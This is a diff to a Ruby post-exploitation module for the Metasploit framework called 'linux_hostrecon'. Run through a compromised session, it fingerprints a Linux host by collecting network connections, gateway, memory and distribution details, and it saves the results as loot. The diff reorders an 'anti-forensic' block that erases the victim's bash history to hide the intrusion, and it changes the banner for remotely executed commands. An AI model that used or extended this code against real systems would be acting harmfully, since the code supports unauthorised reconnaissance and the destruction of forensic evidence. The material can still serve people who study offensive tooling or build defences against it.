@@ -209,10 +209,10 @@ def run
       file_sys = cmd_exec("df -H")
       mont_uuid = cmd_exec("lsblk -f")
       py_version = cmd_exec("python -V")
-      ruby_version = cmd_exec("ruby -v")
       storage_mont = cmd_exec("lsblk -m")
       distro_uname = cmd_exec("uname -a")
       net_stat = cmd_exec("netstat -tulpn")
+      ruby_version = cmd_exec("ruby -v  | awk {'print $1,$2'}")
       net_established = cmd_exec("netstat -atnp | grep \"ESTABLISHED\"")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
@@ -222,7 +222,7 @@ def run
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
-      sh_version = cmd_exec("bash --version | head -1 | awk {'print $4'} | cut -d '-' -f1")
+      sh_version = cmd_exec("bash --version | head -1 | awk {'print $2,$4'} | cut -d '-' -f1")
       mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
@@ -235,7 +235,7 @@ def run
         #
         data_dump << "\n\n"
         data_dump << "Date/Hour: " + date_out + "\n"
-        data_dump << "--------------------------------------\n"
+        data_dump << "---------------------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Computer     : #{sys_info['Computer']}\n"
         data_dump << "Target session PID  : #{session_pid}\n"
@@ -430,8 +430,9 @@ def run
             # to be able to write the logfile and display the outputs ..
             #
             data_dump << "+--------------------------------+\n"
-            data_dump << "|  COMMAND EXECUTED: #{exec_bash} \n"
+            data_dump << "|   COMMAND TO EXECUTE REMOTELY  |\n"
             data_dump << "+--------------------------------+\n"
+            data_dump << "Execute: #{exec_bash}"
             data_dump << "\n\n"
             data_dump << single_comm
             data_dump << "\n\n"
@@ -463,21 +464,21 @@ def run
 
 
      #
+     # Store (data_dump) contents into msf loot folder? (local) ..
+     # IF sellected previous in advanced options (set STORE_LOOT true) ..
+     #
+     if datastore['STORE_LOOT'] == true
+       print_warning("Fingerprints stored under: ~/.msf4/loot folder")
+       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
+       Rex::sleep(0.5)
+     end
+     #
      # linux_hostrecon - Anti-forensic module ..
      # This funtion will delete all entrys from remote bash shell (history command list) ..
      #
      if datastore['DEL_SHELL_HISTORY'] == true
        print_warning("Remote bash shell history commands list deleted ..")
        cmd_exec("history -c")
-       Rex::sleep(0.5)
-     end
-     #
-     # Store (data_dump) contents into msf loot folder? (local) ..
-     # IF sellected previous in advanced options (set STORE_LOOT true) ..
-     #
-     if datastore['STORE_LOOT'] == true
-       print_warning("Target fingerprints stored under: ~/.msf4/loot folder")
-       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
        Rex::sleep(0.5)
      end
 
